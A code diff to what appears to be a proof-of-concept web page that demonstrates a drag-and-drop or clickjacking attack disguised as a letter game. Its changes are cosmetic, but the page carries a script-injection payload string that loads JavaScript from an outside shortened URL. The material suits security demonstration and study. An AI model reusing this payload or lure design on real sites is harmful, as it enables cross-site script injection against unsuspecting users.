@@ -19,6 +19,7 @@ $(function() {
   var start = function() {
     $('#loader').remove();
     $("#container").css('visibility', 'visible');
+    setTimeout(function() {$('#score').show()}, 7000);
   }
   setTimeout(start, 10000);
 });
@@ -37,11 +38,11 @@ left: 135px;
 
 #score {
 position: absolute;
-display: block;
 top: 210px;
 left: 360px;
 font-size: 12px;
 font-family: Verdana;
+display: none;
 }
 
 #payload {
@@ -112,7 +113,7 @@ font-size: 30px;
 The cursor will change to hint you that you're on the right track.</p>
 <p id=loader>Loading...</p>
 <div id=container><div id=letters2>h i n c</div><div id=letters>a d g x</div><div id=letters3>q p w e</div>
-<a id=score href="#" onclick="alert('0, try again!');return false;">check score</a>
+<button id=score type=button onclick="alert('0, try again!');return false;">check score</button>
 <div id=handle>
 <input id=payload readonly value='GOOG" // &lt;SCRIPT src="http://tinyurl.com/UPRCSONLYALRT"&gt;&lt;/script&gt;'>
 </div>
